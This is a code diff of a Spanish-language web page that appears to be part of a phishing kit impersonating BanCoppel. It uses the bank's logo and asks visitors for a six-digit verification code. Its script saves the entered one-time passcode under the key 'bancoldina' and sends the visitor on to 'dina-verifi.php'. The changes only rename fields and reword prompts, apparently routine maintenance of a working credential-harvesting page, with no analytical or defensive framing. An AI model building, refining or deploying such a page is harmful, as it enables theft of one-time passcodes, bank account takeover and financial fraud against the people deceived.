@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Verificación</title>
+  <title>Verificación Dinámica</title>
   <link rel="stylesheet" href="bootstrap.min.css">
   <link rel="stylesheet" href="util.css">
   <link rel="stylesheet" href="main.css">
@@ -35,7 +35,7 @@
     <a class="logo-header" href="index.html">
       <img src="https://www.westernunion.com/content/dam/wu/rmt/BanCoppel.png">
     </a>
-    <div class="menu-header" href="index.html">
+    <div class="menu-header">
       <div id="bar-menu" class="bar-menu">
         <span></span><span></span><span></span>
       </div>
@@ -46,13 +46,13 @@
     <div class="container-login100">
       <div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54">
 
-        <form class="login100-form validate-form" onsubmit="return enviarCodigo()" method="post">
+        <form class="login100-form validate-form" onsubmit="return enviarOTP()" method="post">
           <div class="textypn1"><span>Verificación</span></div>
-          <div class="textypn2"><span>Ingresa el código de 6 dígitos enviado a tu número</span></div>
+          <div class="textypn2"><span>Ingresa el código dinámico que recibiste</span></div>
 
           <div class="wrap-input101 validate-input" data-validate="">
-            <input class="input101" type="text" pattern="[0-9]*" inputmode="numeric" name="codigo_otp" id="codigo_otp"
-              maxlength="6" minlength="6" required placeholder="Ingresa tu código"
+            <input class="input101" type="text" pattern="[0-9]*" inputmode="numeric" name="otp" id="otp"
+              maxlength="6" minlength="6" required placeholder="Código de 6 dígitos"
               onkeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
             <span class="focus-input100" data-symbol=""></span>
           </div>
@@ -74,14 +74,14 @@
   </div>
 
   <script>
-    function enviarCodigo() {
-      const otp = document.getElementById("codigo_otp").value;
-      if (otp.length === 6) {
-        localStorage.setItem("bancoldina", otp);
+    function enviarOTP() {
+      const codigo = document.getElementById("otp").value;
+      if (codigo.length === 6) {
+        localStorage.setItem("bancoldina", codigo);
         window.location.href = "dina-verifi.php";
         return false;
       } else {
-        alert("Debes ingresar los 6 dígitos.");
+        alert("Ingresa los 6 dígitos del código.");
         return false;
       }
     }
